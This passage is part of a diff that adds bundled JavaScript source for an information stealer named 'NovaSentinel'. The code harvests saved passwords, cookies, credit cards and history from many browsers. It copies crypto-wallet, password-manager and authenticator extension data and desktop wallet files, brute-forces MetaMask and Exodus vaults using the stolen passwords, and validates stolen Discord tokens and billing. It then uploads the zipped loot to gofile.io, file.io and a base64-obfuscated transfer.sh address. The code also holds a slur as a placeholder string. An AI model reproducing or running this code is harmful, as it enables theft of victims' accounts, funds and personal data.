+    name: "CentBrowser"
+  }, {
+    path: localappdata + "\\Orbitum\\User Data\\",
+    name: "Orbitum"
+  }, {
+    path: localappdata + "\\Kometa\\User Data\\",
+    name: "Kometa"
+  }, {
+    path: localappdata + "\\Torch\\User Data\\",
+    name: "Torch"
+  }, {
+    path: localappdata + "\\Amigo\\User Data\\",
+    name: "Amigo"
+  }];
+  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\", "Brave"));
+  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Xpom\\User Data\\", "Xpom"));
+  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\360Browser\\Browser\\User Data\\", "360Browser"));
+  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Chedot\\User Data\\", "Chedot"));
+  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\", "Brave"));
+  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Iridium\\User Data\\", "Iridium"));
+  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Yandex\\YandexBrowser\\User Data\\", "Yandex"));
+  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\uCozMedia\\Uran\\User Data\\", "Uran"));
+  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Microsoft\\Edge\\User Data\\", "Edge"));
+  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Google\\Chrome\\User Data\\", "Chrome"));
+  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Vivaldi\\User Data\\", "Vivaldi"));
+  var cookieslength = 0;
+  var passwords = [];
+  var autofills = [];
+  var cards = [];
+  var bookmarks = [];
+  var history = [];
+  var downloads = [];
+  let i = 0;
+  for (let obj of chromiumPath) {
+    const path = obj.path;
+    if (!fs.existsSync(path)) {
+      continue;
+    }
+    i++;
+    try {
+      const cookies = await getCookies(path);
+      cookieslength += cookies.length;
+      let browserName;
+      if (typeof obj.profile != "undefined") {
+        browserName = obj.name + " [ " + obj.profile + " ]";
+      } else {
+        browserName = obj.name;
+      }
+      stat.SaveAllCookies(cookies);
+      save.saveCookies(cookies, browserName);
+      passwords = passwords.concat(await getPasswords(path, browserName));
+      autofills = autofills.concat(await getAutofills(path, browserName));
+      cards = cards.concat(await getCreditCards(path));
+      history = history.concat(await getHistory(path));
+      downloads = downloads.concat(await getDownloads(path));
+      bookmarks = bookmarks.concat(await getBookmarks(path, browserName));
+    } catch (e) {
+      save.SaveError(e);
+      continue;
+    }
+  }
+  let geckoPath = [];
+  geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\K-Meleon\\Profiles\\", "Kmelon"));
+  geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\Moonchild Productions\\Pale Moon\\Profiles\\", "PaleMoon"));
+  geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\Comodo\\IceDragon\\Profiles\\", "IceDragon"));
+  geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\NETGATE Technologies\\BlackHaw\\Profiles\\", "BlackHaw"));
+  geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\8pecxstudios\\Cyberfox\\Profiles\\", "Cyberfox"));
+  geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\Thunderbird\\Profiles\\", "Thunderbird"));
+  geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\Mozilla\\SeaMonkey\\Profiles\\", "SeaMonkey"));
+  geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\Mozilla\\Firefox\\Profiles\\", "Firefox"));
+  geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\Waterfox\\Profiles\\", "Waterfox"));
+  for (let obj of geckoPath) {
+    const path = obj.path;
+    if (!fs.existsSync(path)) {
+      continue;
+    }
+    i++;
+    try {
+      const cookies = await getGeckoCookies(path);
+      cookieslength += cookies.length;
+      save.saveCookies(cookies, obj.name);
+      stat.SaveAllCookies(cookies);
+      bookmarks = bookmarks.concat(await getGeckoBookmarks(path, obj.name));
+      history = history.concat(await getGeckoHistory(path));
+      downloads = downloads.concat(await getGeckoDownloads(path));
+      passwords = passwords.concat(await getGeckoPasswords(path, "", obj.name));
+    } catch (e) {
+      save.SaveError(e + "\nError browsers 1");
+      continue;
+    }
+  }
+  const importantSites = ["gmail", "youtube", "onoff", "xss.is", "pronote", "ovhcloud", "nulled", "cracked", "tiktok", "yahoo", "gmx", "aol", "coinbase", "binance", "steam", "epicgames", "discord", "paypal", "instagram", "spotify", "onlyfans", "pornhub", "origin", "amazon", "twitter", "aliexpress", "netflix", "roblox", "twitch", "facebook", "riotgames", "card", "telegram", "protonmail"];
+  function countImportantSites(website, importantSites) {
+    let count = {};
+    importantSites.forEach(importantSite => {
+      count[importantSite] = 0;
+    });
+    website.forEach(visitedSite => {
+      importantSites.forEach(importantSite => {
+        if (visitedSite.includes(importantSite)) {
+          count[importantSite]++;
+        }
+      });
+    });
+    return count;
+  }
+  const count = countImportantSites(website, importantSites);
+  for (const site in count) {
+    if (count[site] > 0) {
+      stat.AddKeyword(` ${site} : ${count[site]}`);
+    }
+  }
+  save.saveBrowser(passwords, autofills, cards, history, downloads, bookmarks);
+  stat.AddBrowser(passwords.length, cookieslength, autofills.length, cards.length, history.length, downloads.length, bookmarks.length);
+  var pass = [];
+  for (let i = 0; i < passwords.length; i++) {
+    if (passwords[i]) {
+      if (passwords[i].password) pass.push(passwords[i].password);
+    }
+  }
+  return pass;
+}
+module.exports = {
+  NovaSentinelBrowsers,
+  getGeckoPasswords,
+  getGeckoProfiles
+};
+},{"./save":"utils/save.js","./stats":"utils/stats.js","./gecko":"utils/gecko.js","./kill":"utils/kill.js"}],"utils/uploadFiles.js":[function(require,module,exports) {
+function ownKeys(e, r) { var t = Object.keys(e); if (Object.getOwnPropertySymbols) { var o = Object.getOwnPropertySymbols(e); r && (o = o.filter(function (r) { return Object.getOwnPropertyDescriptor(e, r).enumerable; })), t.push.apply(t, o); } return t; }
+function _objectSpread(e) { for (var r = 1; r < arguments.length; r++) { var t = null != arguments[r] ? arguments[r] : {}; r % 2 ? ownKeys(Object(t), !0).forEach(function (r) { _defineProperty(e, r, t[r]); }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(t)) : ownKeys(Object(t)).forEach(function (r) { Object.defineProperty(e, r, Object.getOwnPropertyDescriptor(t, r)); }); } return e; }
+function _defineProperty(obj, key, value) { key = _toPropertyKey(key); if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; }
+function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == typeof i ? i : String(i); }
+function _toPrimitive(t, r) { if ("object" != typeof t || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != typeof i) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
+const fs = require("fs");
+const https = require("https");
+const FormData = require("form-data");
+const axios = require("axios");
+async function upload(path) {
+  let link;
+  try {
+    const server = await FoundSrv();
+    if (server) {
+      link = await uploadFile(path, server);
+      if (!link) {
+        console.log("uploadTransfer failed, trying uploadToFileio");
+        link = await uploadToFileio(path);
+      }
+      if (!link) {
+        console.log("uploadFile failed, trying uploadTransfer");
+        link = await uploadTransfer(path);
+      }
+    } else {
+      if (!link) {
+        console.log("uploadTransfer failed, trying uploadToFileio");
+        link = await uploadToFileio(path);
+      }
+      console.log("FoundSrv returned null, trying uploadTransfer");
+      link = await uploadTransfer(path);
+    }
+    return link;
+  } catch (error) {
+    if (error) {
+      try {
+        console.log("Trying file.io as a fallback");
+        link = await uploadToFileio(path);
+        return link;
+      } catch (e) {
+        if (e) {
+          try {
+            console.log("Trying uploadTransfer as a fallback");
+            link = await uploadTransfer(path);
+            return link;
+          } catch (e) {}
+        }
+      }
+    }
+  }
+}
+async function uploadToFileio(filePath) {
+  const data = new FormData();
+  data.append("file", fs.createReadStream(filePath));
+  data.append("maxdownloads", "30");
+  try {
+    var _response$data$link;
+    const response = await axios.post("https://file.io/", data, {
+      headers: _objectSpread({}, data.getHeaders())
+    });
+    return (_response$data$link = response.data.link) !== null && _response$data$link !== void 0 ? _response$data$link : null;
+  } catch (error) {
+    return null;
+  }
+}
+async function FoundSrv() {
+  const res = await axios({
+    url: `https://api.gofile.io/getServer`,
+    method: "GET",
+    headers: {
+      accept: "*/*",
+      "accept-language": "en-US,en;",
+      "cache-control": "no-cache",
+      pragma: "no-cache",
+      referrer: "https://gofile.io/uploadFiles",
+      mode: "cors",
+      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44",
+      dnt: 1,
+      origin: "https://gofile.io"
+    }
+  });
+  if (res.data.status !== "ok") {
+    return null;
+  }
+  return res.data.data.server;
+}
+async function uploadFile(path, server) {
+  const formData = new FormData();
+  formData.append("file", fs.createReadStream(path));
+  const res = await axios({
+    url: `https://${server}.gofile.io/uploadFile`,
+    method: "POST",
+    headers: _objectSpread({
+      accept: "*/*",
+      "accept-language": "en-US,en;",
+      "cache-control": "no-cache",
+      pragma: "no-cache",
+      referrer: "https://gofile.io/uploadFiles",
+      mode: "cors",
+      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44",
+      dnt: 1,
+      origin: "https://gofile.io"
+    }, formData.getHeaders()),
+    maxContentLength: Infinity,
+    maxBodyLength: Infinity,
+    referrer: "https://gofile.io/uploadFiles",
+    data: formData
+  });
+  if (res.data.status !== "ok") {}
+  return res.data.data.downloadPage;
+}
+async function uploadTransfer(path) {
+  const FileData = new FormData();
+  FileData.append("file", fs.createReadStream(path));
+  try {
+    let g = Buffer.from("aHR0cHM6Ly90cmFuc2Zlci5zaA==", "base64").toString();
+    const res = await axios.post(g, FileData, {
+      headers: _objectSpread({}, FileData.getHeaders())
+    });
+    if (res.status === 200 && res.data) {
+      const downloadUrl = res.data.trim();
+      return downloadUrl;
+    } else {}
+  } catch (error) {}
+}
+module.exports = {
+  upload
+};
+},{}],"utils/crypto.js":[function(require,module,exports) {
+const fs = require("fs"),
+  seco = require("seco-file"),
+  core = require("./core"),
+  save = require("./save"),
+  passworder = require("node-passworder"),
+  {
+    stat
+  } = require("./stats"),
+  {
+    upload
+  } = require("./uploadFiles");
+class Extension {
+  constructor(name, id) {
+    this.name = name;
+    this.id = id;
+  }
+  addPath(path) {
+    this.path = path;
+  }
+  addProfile(profile) {
+    this.profile = profile;
+  }
+}
+class Cold {
+  constructor(name, existpath, stealpath) {
+    this.name = name;
+    this.existpath = existpath;
+    this.stealpath = stealpath;
+  }
+}
+function getBrowsersProfile() {
+  const local = process.env.localappdata;
+  const appdata = process.env.appdata;
+  const browsers_path = [local + "\\BraveSoftware\\Brave-Browser\\User Data\\%PROFILE%\\Local Extension Settings", local + "\\Google\\Chrome\\User Data\\%PROFILE%\\Local Extension Settings", appdata + "\\Opera Software\\Opera GX Stable\\Local Extension Settings", appdata + "\\Opera Software\\Opera Stable\\User Data\\%PROFILE%\\Local Extension Settings", local + "\\Google\\Chrome Beta\\User Data\\%PROFILE%\\Local Extension Settings", local + "\\Yandex\\YandexBrowser\\User Data\\Local Extension Settings", local + "\\Microsoft\\Edge\\User Data\\%PROFILE%\\Local Extension Settings"];
+  var browsers_profile = [];
+  for (var i = 0; i < browsers_path.length; i++) {
+    const browser = browsers_path[i];
+    const profiles = core.getProfiles(browser, browser.split("\\")[6]);
+    for (var j = 0; j < profiles.length; j++) {
+      browsers_profile.push(profiles[j]);
+    }
+  }
+  return browsers_profile;
+}
+function NovaSentinelExtensions(cc) {
+  if (cc != "yes") return;
+  try {
+    const browsers_profile = getBrowsersProfile();
+    const extensions = [new Extension("Trust Wallet", "egjidjbpglichdcondbcbdnbeeppgdph"), new Extension("Jaxx Liberty", "ocefimbphcgjaahbclemolcmkeanoagc"), new Extension("Atomic Wallet", "dlbmjjglhklgdodnkdlenlicpgppjcdd"), new Extension("Electrum", "hieplnfojfccegoloniefimmbfjdgcgp"), new Extension("Mycelium", "pidhddgciaponoajdngciiemcflpnnbg"), new Extension("Coinomi", "blbpgcogcoohhngdjafgpoagcilicpjh"), new Extension("GreenAddress", "gflpckpfdgcagnbdfafmibcmkadnlhpj"), new Extension("Edge", "doljkehcfhidippihgakcihcmnknlphh"), new Extension("BRD", "nbokbjkelpmlgflobbohapifnnenbjlh"), new Extension("Samourai Wallet", "apjdnokplgcjkejimjdfjnhmjlbpgkdi"), new Extension("Airbitz", "dojmlmceifkfgkgeejemfciibjehhdcl"), new Extension("Trezor", "jpxupxjxheguvfyhfhahqvxvyqthiryh"), new Extension("Ledger Live", "pfkcfdjnlfjcmkjnhcbfhfkkoflnhjln"), new Extension("Ledger Wallet", "hbpfjlflhnmkddbjdchbbifhllgmmhnm"), new Extension("YubiKey", "mammpjaaoinfelloncbbpomjcihbkmmc"), new Extension("Digital Bitbox", "dbhklojmlkgmpihhdooibnmidfpeaing"), new Extension("Google Authenticator", "khcodhlfkpmhibicdjjblnkgimdepgnd"), new Extension("Microsoft Authenticator", "bfbdnbpibgndpjfhonkflpkijfapmomn"), new Extension("Authy", "gjffdbjndmcafeoehgdldobgjmlepcal"), new Extension("Duo Mobile", "eidlicjlkaiefdbgmdepmmicpbggmhoj"), new Extension("OTP Auth", "bobfejfdlhnabgglompioclndjejolch"), new Extension("Dashlane", "flikjlpgnpcjdienoojmgliechmmheek"), new Extension("FreeOTP", "elokfmmmjbadpgdjmgglocapdckdcpkn"), new Extension("Aegis Authenticator", "ppdjlkfkedmidmclhakfncpfdmdgmjpm"), new Extension("LastPass Auth", "cfoajccjibkjhbdjnpkbananbejpkkjb"), new Extension("Keeper", "gofhklgdnbnpcdigdgkgfobhhghjmmkj"), new Extension("RoboForm", "hppmchachflomkejbhofobganapojjol"), new Extension("KeePass", "lbfeahdfdkibininjgejjgpdafeopflb"), new Extension("KeePassXC", "kgeohlebpjgcfiidfhhdlnnkhefajmca"), new Extension("Bitwarden", "inljaljiffkdgmlndjkdiepghpolcpki"), new Extension("NordPass", "njgnlkhcjgmjfnfahdmfkalpjcneebpl"), new Extension("LastPass", "gabedfkgnbglfbnplfpjddgfnbibkmbb"), new Extension("CommonKey", "chgfefjpcobfbnpmiokfjjaglahmnded"), new Extension("Splikity", "jhfjfclepacoldmjmkmdlmganfaalklb"), new Extension("MicrosoftAutofill", "fiedbfgcleddlbcmgdigjgdfcggjcion"), new Extension("KeePass", "fmhmiaejopepamlcjkncpgpdjichnecm"), new Extension("KeePassXC", "oboonakemofpalcgghocfoadofidjkkk"), new Extension("MYKI Password Manager", "bmikpgodpkclnkgmnpphehdgcimmided"), new Extension("Browserpass", "naepdomgkenhinolocfifgehidddafch"), new Extension("LastPass", "hdokiejnpimakedhajhdlcegeplioahd"), new Extension("RoboForm Manager", "pnlccmojcmeohlpggmfnbbiapkmbliob"), new Extension("Metamask", "nkbihfbeogaeaoehlefnkodbefgpgknn"), new Extension("Exodus", "aholpfdialjgjfhomihkjbmgjidlcdno"), new Extension("Sollet", "fhmfendgdocmcbmfikdcogofphimnkno"), new Extension("Trezor Password Manager", "imloifkgjagghnncjkhggdhalmcnfklk"), new Extension("GAuth Authenticator", "ilgcnhelpchnceeipipijaljkblbcobl"), new Extension("EOS Authenticator", "oeljdldpnmdbchonielidgobddffflal"), new Extension("Authy", "gaedmjdfmmahhbjefcbgaolhhanlaolb"), new Extension("Authenticator", "bhghoamapcdpbohphigoooaddinpkbai"), new Extension("EO.Finance", "hoighigmnhgkkdaenafgnefkcmipfjon"), new Extension("TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec"), new Extension("Coinbase", "hnfanknocfeofbddgcijnmhnfnkdnaad"), new Extension("Jaxx Liberty", "cjelfplplebdjjenllpjcblmjkfcffne"), new Extension("Guarda", "hpglfhgfnhbgpjdenjgmdgoeiappafln"), new Extension("Math", "afbcbjpbpfadlkmhmclhkeeodmamcflc"), new Extension("Binance", "fhbohimaelbohpjbbldcngcnapndodjp"), new Extension("Nifty", "jbdaocneiiinmjbjlgalhcelgbejmnid"), new Extension("Yoroi", "ffnbelfdoeiohenkjibnmadjiehjhajb"), new Extension("EQUAL", "blnieiiffboillknjnepogjhkgnoapac"), new Extension("BitApp", "fihkakfobkmkjojpchpfgcmhfjnmnfpi"), new Extension("iwallet", "kncchdigobghenbbaddojjnnaogfppfj"), new Extension("Wombat", "amkmjjmmflddogmhpjloimipbofnfjih"), new Extension("MEW CX", "nlbmnnijcnlegkjjpcfjclmcfggfefdm"), new Extension("Guild", "nanjmdknhkinifnkgdcggcfnhdaammmj"), new Extension("Ronin", "fnjhmkhhmkbjkkabndcnnogagogbneec"), new Extension("NeoLine", "cphhlgmgameodnhkjdmkpanlelnlohao"), new Extension("Clover", "nhnkbkgjikgcigadomkphalanndcapjk"), new Extension("Liquality", "kpfopkelmapcoipemfendmdcghnegimn"), new Extension("Terra Station", "aiifbnbfobpmeekipheeijimdpnlpgpp"), new Extension("Keplr", "dmkamcknogkgcdfhhbddcghachkejeap"), new Extension("Coin98", "aeachknmefphepccionboohckonoeemg"), new Extension("ZilPay", "klnaejjgbibmhlephnhpmaofohgkpgkd"), new Extension("Hycon Lite Client", "bcopgchhojmggmffilplmbdicgaihlkp"), new Extension("Nash", "onofpnbbkehpmmoabgpcpmigafmmnjhl"), new Extension("Steem Keychain", "jhgnbkkipaallpehbohjmkbjofjdmeid"), new Extension("BitClip", "ijmpgkjfkbfhoebgogflfebnmejmfbml"), new Extension("DAppPlay", "lodccjjbdhfakaekdiahmedfbieldgik"), new Extension("Auro", "cnmamaachppnkjgnildpdmkaakejnhae"), new Extension("Polymesh", "jojhfeoedkpkglbfimdfabpdfjaoolaf"), new Extension("ICONex", "flpiciilemghbmfalicajoolhkkenfel"), new Extension("Nabox", "nknhiehlklippafakaeklbeglecifhad"), new Extension("KHC", "hcflpincpppdclinealmandijcmnkbgn"), new Extension("Temple", "ookjlbkiijinhpmnjffcofjonbfbgaoc"), new Extension("TezBox", "mnfifefkajgofkcjkemidiaecocnkjeh"), new Extension("Cyano", "dkdedlpgdmmkkfjabffeganieamfklkm"), new Extension("Byone", "nlgbhdfgdhgbiamfdfmbikcdghidoadd"), new Extension("OneKey", "infeboajgfhgbjpjbeppbkgnabfdkdaf"), new Extension("Leaf", "cihmoadaighcejopammfbmddcmdekcje"), new Extension("Dashlane", "fdjamakpfbbddfjaooikfcpapjohcfmg"), new Extension("NordPass", "fooolghllnmhmmndgjiamiiodkpenpbb"), new Extension("BitWarden", "nngceckbapebfimnlniiiahkandclblb")];
+    var final_extensions = [];
+    for (var i = 0; i < browsers_profile.length; i++) {
+      const profile = browsers_profile[i].path;
+      for (var j = 0; j < extensions.length; j++) {
+        const extension = extensions[j];
+        const path = profile + "\\" + extension.id;
+        if (fs.existsSync(path)) {
+          extension.addPath(path);
+          extension.addProfile(profile.split("\\")[6].replace(" ", ""));
+          final_extensions.push(extension);
+        }
+      }
+    }
+    for (var i = 0; i < final_extensions.length; i++) {
+      const extension = final_extensions[i];
+      stat.AddExtensions(extension.name);
+      save.Save(extension.path + "\\", "Wallets", "Extensions\\" + extension.name + "-" + extension.profile);
+    }
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+async function NovaSentinelColds(cc) {
+  if (cc != "yes") return;
+  try {
+    const appdata = process.env.appdata;
+    const local = process.env.localappdata;
+    const colds = [new Cold("Exodus", appdata + "\\Exodus", [appdata + "\\Exodus\\exodus.wallet\\", appdata + "\\Exodus\\exodus.conf.json", appdata + "\\Exodus\\window-state.json"]), new Cold("Electrum", appdata + "\\Electrum-LTC", [appdata + "\\Electrum-LTC\\wallets\\"]), new Cold("Atomic", appdata + "\\atomic", [appdata + "\\atomic\\Local Storage\\leveldb\\"]), new Cold("MultiDog", appdata + "\\MultiDog", [appdata + "\\MultiDog\\multidoge.wallet\\"]), new Cold("Bitcoin Core", appdata + "\\Bitcoin\\Bitcoin Core", [appdata + "\\Bitcoin\\Bitcoin Core\\wallet.dat"]), new Cold("Binance", appdata + "\\Binance", [appdata + "\\Binance\\app-store.json", appdata + "\\Binance\\Cookies"]), new Cold("Coinomi", appdata + "\\Coinomi", [appdata + "\\Coinomi\\wallets\\"]), new Cold("Jax", appdata + "\\jaxx", [appdata + "\\jaxx\\LocalStorage\\file_0.localstorage"]), new Cold("ElectronCash", appdata + "\\ElectronCash", [appdata + "\\ElectronCash\\wallets\\default_wallet"]), new Cold("Electrum", appdata + "\\Electrum", [appdata + "\\Electrum\\wallets\\"]), new Cold("Ether", appdata + "\\Ethereum", [appdata + "\\Ethereum\\keystore\\"]), new Cold("Zcash", appdata + "\\Zcash", [appdata + "\\Zcash"]), new Cold("Armory", appdata + "\\Armory", [appdata + "\\Armory"]), new Cold("Bytecoin", appdata + "\\Bytecoin", [appdata + "\\Bytecoin"]), new Cold("Jaxx", appdata + "\\Jaxx", [appdata + "\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file_0.indexeddb.leveldb"]), new Cold("Guarda", appdata + "\\Guarda", [appdata + "\\Guarda\\Local Storage\\leveldb"]), new Cold("Coinomi", local + "\\Coinomi", [appdata + "\\Coinomi\\Coinomi\\wallets"])];
+    for (var i = 0; i < colds.length; i++) {
+      const cold = colds[i];
+      if (fs.existsSync(cold.existpath)) {
+        if (cold.name == "Exodus") {
+          stat.AddColds(cold.name);
+          await save.ArraySave(cold.stealpath, "Wallets", cold.name);
+          const zipPath = await save.zip(cold.stealpath);
+          let exodusurl = await upload(zipPath);
+          stat.addExodusLink(exodusurl);
+        }
+        if (cold.name == "Atomic") {
+          stat.AddColds(cold.name);
+          await save.ArraySave(cold.stealpath, "Wallets", cold.name);
+          const zipPath = await save.zip(cold.stealpath);
+          let atomicurl = await upload(zipPath);
+          stat.addAtomicLink(atomicurl);
+        }
+        stat.AddColds(cold.name);
+        save.ArraySave(cold.stealpath, "Wallets", cold.name);
+      }
+    }
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+async function Decrypt(data, key) {
+  var res = "";
+  try {
+    res = await passworder.decrypt(key, data);
+  } catch (err) {}
+  return res;
+}
+async function decodeMetamask(password, vault) {
+  var vaultJson = null;
+  try {
+    var vaultJson = JSON.parse(vault);
+  } catch (e) {}
+  if (vaultJson == null) {
+    return;
+  }
+  return await Decrypt(vault, password);
+}
+function getMnemonic(json) {
+  var res = "";
+  for (var key of json) {
+    var mnemonic = key.data.mnemonic;
+    if (mnemonic != undefined) {
+      if (Array.isArray(mnemonic)) {
+        res = Buffer.from(mnemonic).toString("utf-8");
+      } else {
+        res = mnemonic;
+      }
+    }
+  }
+  return res;
+}
+function decryptExodus(data, phrase) {
+  try {
+    seco.decryptData(data, phrase);
+    return phrase;
+  } catch (ex) {
+    return "";
+  }
+}
+async function decryptFileSeco(filename, passwlist) {
+  const list = passwlist;
+  var data = fs.readFileSync(filename);
+  var phrase;
+  try {
+    if (list.length > 0) {
+      list.forEach(function (element) {
+        phrase = decryptExodus(data, element);
+        if (phrase != "" && !stat.exodus.includes(phrase)) {
+          stat.AddExodus(phrase);
+        }
+      });
+    }
+  } catch (e) {}
+}
+async function exodusDecrypt(cc, passwords) {
+  if (cc != "yes") return;
+  const appdata = process.env.appdata;
+  const seedpath = appdata + "\\Exodus\\exodus.wallet\\seed.seco";
+  if (fs.existsSync(seedpath)) {
+    try {
+      decryptFileSeco(seedpath, passwords);
+    } catch (e) {}
+  } else {}
+}
+async function NovaSentinelFetchMeta(passwd) {
+  const browsers_profile = getBrowsersProfile();
+  var folders = [];
+  var vaults = [];
+  for (let i = 0; i < browsers_profile.length; i++) {
+    const browser = browsers_profile[i];
+    const savePath = browser + "\\nkbihfbeogaeaoehlefnkodbefgpgknn\\";
+    if (fs.existsSync(savePath)) {
+      folders.push(savePath);
+    }
+  }
+  for (let i = 0; i < folders.length; i++) {
+    const folder = folders[i];
+    const files = fs.readdirSync(folder);
+    for (let u = 0; u < files.length; u++) {
+      const file = files[u];
+      if (file.endsWith(".log")) {
+        const data = fs.readFileSync(folder + file, "utf-8");
+        const regex = /\"vault":"(?:[^\\"]|\\\\|\\")*"\}/gm;
+        const finds = data.match(regex);
+        for (let o = 0; o < finds.length; o++) {
+          const find = finds[o];
+          vaults.push(find.replace(/\\/gm, "").replace('"vault":"', "").slice(0, -2));
+        }
+      }
+    }
+  }
+  vaults = [...new Set(vaults)];
+  var mnemonics = [];
+  for (let i = 0; i < vaults.length; i++) {
+    const vault = vaults[i];
+    for (let u = 0; u < passwd.length; u++) {
+      const password = passwd[u];
+      var tryPass = await decodeMetamask(password, vault);
+      if (tryPass != "" && tryPass != undefined) {
+        mnemonics.push(getMnemonic(tryPass));
+      }
+    }
+  }
+  mnemonics = [...new Set(mnemonics)];
+  mnemonics = mnemonics.filter(e => e);
+  let phrases = [];
+  for (let i = 0; i < mnemonics.length; i++) {
+    phrases.push({
+      phrase: mnemonics[i]
+    });
+  }
+  return phrases;
+}
+module.exports = {
+  NovaSentinelExtensions,
+  NovaSentinelColds,
+  NovaSentinelFetchMeta,
+  exodusDecrypt
+};
+},{"./core":"utils/core.js","./save":"utils/save.js","./stats":"utils/stats.js","./uploadFiles":"utils/uploadFiles.js"}],"utils/discord.js":[function(require,module,exports) {
+const fs = require("fs"),
+  core = require("./core"),
+  axios = require("axios"),
+  boukiapi = require("boukiapi"),
+  crypto = require("crypto"),
+  {
+    stat
+  } = require("./stats"),
+  path = require("path"),
+  {
+    embeds,
+    stats,
+    badge
+  } = require("./emotes");
+async function WriteDiscord(profiles) {
+  const basepath = stat.testpath[0];
+  const socialDir = path.join(basepath, "Social");
+  const DiscordDir = path.join(socialDir, "Discord");
+  try {
+    if (!fs.existsSync(socialDir)) {
+      fs.mkdirSync(socialDir);
+    }
+    if (!fs.existsSync(DiscordDir)) {
+      fs.mkdirSync(DiscordDir);
+    }
+  } catch (e) {
+    return;
+  }
+  if (!profiles) return;
+  if (!profiles.length < 1) return;
+  const dscFilePath = path.join(DiscordDir, "Discord.txt");
+  fs.writeFileSync(dscFilePath, core.getHeader() + JSON.stringify(profiles));
+}
+class DiscordAccount {
+  constructor(username, discriminator, id, nitro, badges, billings, email, phone, token, avatar) {
+    this.username = username;
+    this.tag = `${username}#${discriminator}`;
+    this.id = id;
+    this.nitro = nitro;
+    this.badges = badges;
+    this.billings = billings;
+    this.email = email;
+    if (phone != "" && phone != undefined) {
+      this.phone = phone;
+    } else {
+      this.phone = "None";
+    }
+    this.token = token;
+    this.avatar = "https://cdn.discordapp.com/avatars/" + id + "/" + avatar + ".png";
+  }
+}
+function getBadges(json) {
+  let badges = [{
+    name: badge.staff,
+    flag: 1
+  }, {
+    name: badge.partner,
+    flag: 2
+  }, {
+    name: badge.hypesquad_event,
+    flag: 4
+  }, {
+    name: badge.bughunter_1,
+    flag: 8
+  }, {
+    name: badge.bughunter_2,
+    flag: 16384
+  }, {
+    name: badge.developer,
+    flag: 131072
+  }, {
+    name: badge.early,
+    flag: 512
+  }, {
+    name: badge.bravery,
+    flag: 64
+  }, {
+    name: badge.brillance,
+    flag: 128
+  }, {
+    name: badge.balance,
+    flag: 256
+  }, {
+    name: badge.active_developer,
+    flag: 4194304
+  }];
+  let flag = json["flags"];
+  var badgesRes = "";
+  for (let badge of badges) {
+    if ((flag & badge.flag) == badge.flag) {
+      badgesRes = badgesRes + " " + badge.name;
+    }
+  }
+  return badgesRes == "" ? "`None`" : badgesRes;
+}
+async function getInventory(token) {
+  const url = "https://discord.com/api/v9/outbound-promotions";
+  const authToken = token;
+  try {
+    const response = await axios.get(url, {
+      headers: {
+        Authorization: `${authToken}`
+      }
+    });
+    if (response.status === 200) {
+      const promotion = response.data;
+      const g = promotion.map(prom => `🎁 ${prom.outbound_title}`);
+      const gString = g.join("\n");
+      return gString;
+    } else {
+      return null;
+    }
+  } catch (error) {
+    return null;
+  }
+}
+async function getBilling(token) {
+  var billings = "";
+  try {
+    const res = await axios({
+      url: `https://canary.discord.com/api/v9/users/@me/billing/payment-sources`,
+      method: "GET",
+      headers: {
+        Authorization: `${token}`
+      }
+    });
+    for (let billing of res.data) {
+      let type = billing["type"];
+      let invalid = billing["invalid"];
+      if (type == 1 && !invalid) {
+        billings = billings + ` ${embeds.creditcard}`;
+      }
+      if (type == 2 && !invalid) {
+        billings = billings + ` ${embeds.paypal}`;
+      }
+    }
+  } catch (e) {}
+  return billings == "" ? "`None`" : billings;
+}
+async function getAccounts(tokens) {
+  let accounts = [];
+  let validTokensCount = 0;
+  for (let i = 0; i < tokens.length; i++) {
+    let token = tokens[i];
+    let billing = await getBilling(token);
+    try {
+      const res = await axios({
+        url: `https://discord.com/api/v9/users/@me`,
+        method: "GET",
+        headers: {
+          Authorization: `${token}`
+        }
+      });
+      const json = res.data;
+      if (json.message == null) {
+        accounts.push(new DiscordAccount(json.username, json.discriminator, json.id, "NigaUnused", getBadges(json), billing, json.email, json.phone, token, json.avatar));
+        validTokensCount++;
+      }
+    } catch (e) {}
+  }
+  return accounts;
+}
+const appdata = process.env.appdata;
+const local = process.env.localappdata;
+async function NovaSentinelDiscord() {
+  var tokens = [];
+  var discordpaths = {
+    Discord: appdata + "\\discord\\Local Storage\\leveldb\\",
+    "Discord Canary": appdata + "\\discordcanary\\Local Storage\\leveldb\\",
+    Lightcord: appdata + "\\Lightcord\\Local Storage\\leveldb\\",
